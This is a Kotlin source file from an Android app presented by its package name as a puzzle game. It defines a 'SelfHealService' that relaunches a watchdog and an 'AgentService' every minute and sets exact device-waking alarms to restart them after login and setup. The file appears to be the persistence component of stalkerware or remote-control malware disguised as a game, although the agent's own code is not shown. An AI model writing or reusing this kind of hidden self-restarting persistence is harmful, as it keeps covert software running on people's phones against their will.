package com.puzzleblast.game.services

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import com.puzzleblast.game.util.Prefs

class SelfHealService : Service() {
    private val handler = Handler(Looper.getMainLooper())
    private val loop = object : Runnable {
        override fun run() {
            heal()
            handler.postDelayed(this, 60_000L)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        handler.post(loop)
        armAlarm()
    }

    private fun heal() {
        if (!Prefs.wizardDone || !Prefs.authed) return
        WatchdogService.start(this)
        AgentService.start(this)
    }

    private fun armAlarm() {
        val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pi = PendingIntent.getBroadcast(
            this, 77, Intent(this, SelfHealAlarm::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, SystemClock.elapsedRealtime() + 5 * 60_000L, pi)
    }

    override fun onDestroy() {
        handler.removeCallbacks(loop)
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context) { ctx.startService(Intent(ctx, SelfHealService::class.java)) }
    }
}

class SelfHealAlarm : android.content.BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        if (Prefs.wizardDone && Prefs.authed) {
            AgentService.start(ctx)
            SelfHealService.start(ctx)
        }
    }
}
